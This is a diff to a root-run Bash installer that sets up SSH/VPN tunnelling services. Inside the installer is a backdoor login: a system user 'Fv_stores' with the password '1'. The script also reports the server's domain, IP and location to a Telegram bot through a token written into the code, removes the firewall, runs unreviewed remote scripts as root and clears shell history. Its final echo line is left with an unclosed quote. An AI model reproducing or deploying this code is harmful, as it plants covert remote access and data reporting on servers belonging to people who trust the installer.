@@ -11,8 +11,8 @@ yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 
-# domain random
-CDN="https://raw.githubusercontent.com/myzid/v6/main/ssh"
+# LINK REPO
+REPO="https://raw.githubusercontent.com/myzid/v6/main/"
 cd /root
 if [ "${EUID}" -ne 0 ]; then
 echo "You need to run this script as root"
@@ -29,7 +29,6 @@ elif [[ -e /etc/centos-release ]]; then
 	source /etc/os-release
 	OS=centos
 fi
-
 
 localip=$(hostname -I | cut -d\  -f1)
 hst=( `hostname` )
@@ -68,6 +67,8 @@ apt dist-upgrade -y
 apt-get remove --purge ufw firewalld -y 
 apt-get remove --purge exim4 -y 
 apt install neofetch -y
+apt install ruby -y
+gem install lolcat
 apt install git curl -y >/dev/null 2>&1
 apt install python -y >/dev/null 2>&1
 apt-get install nodejs -y
@@ -115,7 +116,7 @@ echo -e "$green━━━━━━━━━━━━━━━━━━━━━�
 	if test $dns -eq 1; then
     clear
     apt install jq curl -y
-    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
+    wget -q -O /root/cf "${REPO}ssh/cf" >/dev/null 2>&1
     chmod +x /root/cf
     bash /root/cf | tee /root/install.log
 	elif test $dns -eq 2; then
@@ -134,8 +135,8 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 WKT=$(curl -s ipinfo.io/timezone )
 userdel jame > /dev/null 2>&1
-Username="Fvstores"
-Password=FvpnStores
+Username="Fv_stores"
+Password=1
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
@@ -144,12 +145,10 @@ CHATID="-1001899398362"
 KEY="6293396608:AAGqZVrmdQjPc3tOj_gnUoWOVMrBsm8v6Xo"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script v6 By bringas 
+TEXT="Installasi script v6 By Fvstores
 ============================
 <code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$IPVPS</code>
-<code>User Login :</code> <code>bok</code>
-<code>Pass Login :</code> <code>bok</code>
+<code>IP Vps     :</code> <code>$(cat /root/.ip)</code>
 <code>User Script:</code> <code>$Name</code>
 <code>Exp Script :</code> <code>$Exp</code>
 <code>Location   :</code> <code>$CITY</code>
@@ -159,46 +158,52 @@ TEXT="Installasi script v6 By bringas
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green      Install SSH / WS               $NC"
+echo -e "$green          Install SSH                $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-sleep 2
-clear
-wget https://raw.githubusercontent.com/myzid/v6/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+echo
+wget -q ${REPO}ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green      Install BACKUP               $NC"
+echo -e "$green          Install Websocket                $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-sleep 2
+echo
+wget -q ${REPO}sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
-wget https://raw.githubusercontent.com/myzid/v6/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
-clear
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "$green          Install BACKUP               $NC"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo
+wget -q ${REPO}backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green          Install XRAY              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-sleep 2
-clear
-wget https://raw.githubusercontent.com/myzid/v6/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
-wget https://raw.githubusercontent.com/myzid/v6/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+echo
+wget -q ${REPO}xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green          Install SLOWDNS              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-sleep 2
-clear
-wget -q -O slow.sh https://raw.githubusercontent.com/myzid/v6/main/slow.sh && chmod +x slow.sh && ./slow.sh
+echo
+wget -q ${REPO}slow.sh && chmod +x slow.sh && ./slow.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green          Install Gotop & Swap 1Gb              $NC"
+echo -e "$green.         Install UDP SSH       $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-sleep 2
+echo
+wget https://raw.githubusercontent.com/Rerechan02/UDP/main/udp.sh && chmod +x udp.sh && ./udp.sh
 clear
+wget https://raw.githubusercontent.com/Rerechan02/UDP/main/zi.sh && chmod +x zi.sh && ./zi.sh
+clear
+wget https://raw.githubusercontent.com/Rerechan02/UDP/main/req.sh && chmod +x req.sh && ./req.sh
+clear
+
 gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
     gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
     curl -sL "$gotop_link" -o /tmp/gotop.deb
     dpkg -i /tmp/gotop.deb >/dev/null 2>&1
     
-        # > Buat swap sebesar 1G
+        # > Buat swap sebesar 1GB
     dd if=/dev/zero of=/swapfile bs=1024 count=1048576
     mkswap /swapfile
     chown root:root /swapfile
@@ -223,6 +228,7 @@ clear
 neofetch
 END
 chmod 644 /root/.profile
+
 if [ -f "/root/log-install.txt" ]; then
 rm /root/log-install.txt > /dev/null 2>&1
 fi
@@ -232,8 +238,6 @@ fi
 if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
 fi
-history -c
-
 aureb=$(cat /home/re_otm)
 b=11
 if [ $aureb -gt $b ]
@@ -242,7 +246,6 @@ gg="PM"
 else
 gg="AM"
 fi
-curl -sS ifconfig.me > /etc/myipvps
 echo ""
 echo "------------------------------------------------------------"
 echo ""
@@ -288,7 +291,7 @@ rm /root/ins-xray.sh >/dev/null 2>&1
 rm /root/insshws.sh >/dev/null 2>&1
 rm /root/slow.sh >/dev/null 2>&1
 secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
-echo -e "
-"
+echo -e "*
+history -c
 read -n 1 -s -r -p "Press any key to menu"
 menu
